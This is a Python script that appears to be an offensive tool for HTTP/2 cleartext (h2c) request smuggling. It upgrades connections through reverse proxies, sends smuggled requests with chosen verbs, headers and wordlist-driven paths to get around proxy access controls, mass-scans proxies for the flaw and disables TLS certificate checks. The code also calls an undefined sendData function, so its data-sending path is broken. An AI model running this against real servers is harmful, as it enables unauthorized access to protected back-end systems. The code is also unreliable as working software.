#!/usr/bin/env python3
import h2.connection
from h2.events import (
    ResponseReceived, DataReceived, StreamReset, StreamEnded
)

import argparse
import multiprocessing.dummy as mp
import socket
import ssl
import sys
from urllib.parse import urlparse, urljoin

MAX_TIMEOUT = 10
UPGRADE_ONLY = False


def handle_events(events, isVerbose):
    for event in events:
        if isinstance(event, ResponseReceived):
            handle_response(event.headers, event.stream_id)
        elif isinstance(event, DataReceived):
            print(event.data.decode('utf-8', 'replace'))
            print("")
        elif isinstance(event, StreamReset):
            raise RuntimeError("stream reset: %d" % event.error_code)
        else:
            if isVerbose:
                print("[INFO] " + str(event))


def handle_response(response_headers, stream_id):
    for name, value in response_headers:
        print("%s: %s" % (name.decode('utf-8'), value.decode('utf-8')))

    print("")


def establish_tcp_connection(proxy_url):
    global MAX_TIMEOUT

    port = proxy_url.port or (80 if proxy_url.scheme == "http" else 443)
    connect_args = (proxy_url.hostname, int(port))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if proxy_url.scheme == "https":
        context = ssl.create_default_context()
        context.check_hostname = False  # 🚨 Desativa verificação do hostname
        context.verify_mode = ssl.CERT_NONE  # 🚨 Ignora verificação do certificado
        sock = context.wrap_socket(sock, server_hostname=proxy_url.hostname)

    sock.settimeout(MAX_TIMEOUT)
    sock.connect(connect_args)

    return sock

def send_initial_request(connection, proxy_url, settings):
    global UPGRADE_ONLY
    path = proxy_url.path or "/"

    addl_conn_str = b", HTTP2-Settings"
    if UPGRADE_ONLY:
        addl_conn_str = b""

    request = (
        b"GET " + path.encode('utf-8') + b" HTTP/1.1\r\n" +
        b"Host: " + proxy_url.hostname.encode('utf-8') + b"\r\n" +
        b"Accept: */*\r\n" +
        b"Accept-Language: en\r\n" +
        b"Upgrade: h2c\r\n" +
        b"HTTP2-Settings: " + b"AAMAAABkAARAAAAAAAIAAAAA" + b"\r\n" +
        b"Connection: Upgrade" + addl_conn_str + b"\r\n" +
        b"\r\n"
    )
    connection.sendall(request)


def get_upgrade_response(connection, proxy_url):
    data = b''
    while b'\r\n\r\n' not in data:
        data += connection.recv(8192)

    headers, rest = data.split(b'\r\n\r\n', 1)

    split_headers = headers.split()
    if split_headers[1] != b'101':
        print("[INFO] Failed to upgrade: " + proxy_url.geturl())
        return None, False

    return rest, True


def getData(h2_connection, sock):
    events = []
    try:
        while True:
            newdata = sock.recv(8192)
            events += h2_connection.receive_data(newdata)
            if len(events) > 0 and isinstance(events[-1], StreamEnded):
                raise socket.timeout()
    except socket.timeout:
        pass

    return events


def sendSmuggledRequest(h2_connection, connection,
                        smuggled_request_headers, args):

    stream_id = h2_connection.get_next_available_stream_id()

    h2_connection.send_headers(stream_id,
                               smuggled_request_headers,
                               end_stream=args.data is None)
    connection.sendall(h2_connection.data_to_send())

    if args.data:
        sendData(h2_connection,
                 connection,
                 args.data.encode("UTF-8"),
                 stream_id)

    events = getData(h2_connection, connection)
    handle_events(events, args.verbose)


def main(args):
    if not args.proxy.startswith("http"):
        print("[ERROR]: invalid protocol: " + args.proxy, file=sys.stderr)
        sys.exit(1)

    proxy_url = urlparse(args.proxy)

    connection = establish_tcp_connection(proxy_url)

    h2_connection = h2.connection.H2Connection()
    settings_header_value = h2_connection.initiate_upgrade_connection()

    send_initial_request(connection, proxy_url, settings_header_value)

    extra_data, success = get_upgrade_response(connection, proxy_url)

    if not success:
        sys.exit(1)

    print("[INFO] h2c stream established successfully.")
    if args.test:
        print("[INFO] Success! " + args.proxy + " can be used for tunneling")
        sys.exit(0)

    connection.sendall(h2_connection.data_to_send())

    events = h2_connection.receive_data(extra_data)

    events = getData(h2_connection, connection)

    connection.sendall(h2_connection.data_to_send())

    handle_events(events, args.verbose)

    if args.wordlist:
        with open(args.wordlist) as fd:
            urls = [urlparse(urljoin(args.url, url.strip()))
                    for url in fd.readlines()]
    else:
        urls = [urlparse(args.url)]

    for url in urls:
        path = url.path or "/"
        query = url.query

        if query:
            path = path + "?" + query

        smuggled_request_headers = [
            (':method', args.request),
            (':authority', url.hostname),
            (':scheme', url.scheme),
            (':path', path),
        ]

        if args.header:
            for header in args.header:
                smuggled_request_headers.append(tuple(header.split(": ")))

        print("[INFO] Requesting - " + path)
        sendSmuggledRequest(h2_connection,
                            connection,
                            smuggled_request_headers,
                            args)

    h2_connection.close_connection()
    connection.sendall(h2_connection.data_to_send())
    connection.shutdown(socket.SHUT_RDWR)
    connection.close()


def scan(line):
    connection = None
    try:
        proxy_url = urlparse(line)
        if not line.startswith("http"):
            print("[ERROR]: skipping invalid protocol: " + line)
            return

        connection = establish_tcp_connection(proxy_url)

        h2_connection = h2.connection.H2Connection()
        settings_header_value = h2_connection.initiate_upgrade_connection()

        send_initial_request(connection, proxy_url,
                             settings_header_value)
        _, success = get_upgrade_response(connection, proxy_url)
        if not success:
            return

        print("[INFO] Success! " + line + " can be used for tunneling")
        sys.stdout.flush()
    except Exception as e:
        print("[ERROR] " + e.__str__() + ": " + line, file=sys.stderr)
        sys.stderr.flush()
    finally:
        if connection:
            connection.shutdown(socket.SHUT_RDWR)
            connection.close()


def init():
    global MAX_TIMEOUT, UPGRADE_ONLY

    if sys.version_info < (3, 0):
        sys.stdout.write("Sorry, requires Python 3.x, not Python 2.x\n")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Detect and exploit insecure forwarding of h2c upgrades.",
    )
    parser.add_argument("-x", "--proxy", help="proxy server to try to bypass")
    parser.add_argument("-i", "--wordlist", help="list of paths to bruteforce")
    parser.add_argument("-X", "--request", default="GET", help="smuggled verb")
    parser.add_argument("-d", "--data", help="smuggled data")
    parser.add_argument("-H", "--header", action="append", help="smuggled headers")
    parser.add_argument("-m", "--max-time",
                        type=float,
                        default=10,
                        help="Socket timeout in seconds (default: 10)")
    parser.add_argument("--upgrade-only",
                        default=False,
                        action="store_true",
                        help="Drop HTTP2-Settings from outgoing Connection header")  # ✅ Adicionado aqui
    parser.add_argument("-t", "--test", help="test a single proxy server", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("url", nargs="?")
    args = parser.parse_args()

    MAX_TIMEOUT = args.max_time
    UPGRADE_ONLY = args.upgrade_only  # ✅ Agora definido corretamente

    main(args)

if __name__ == "__main__":
    init()
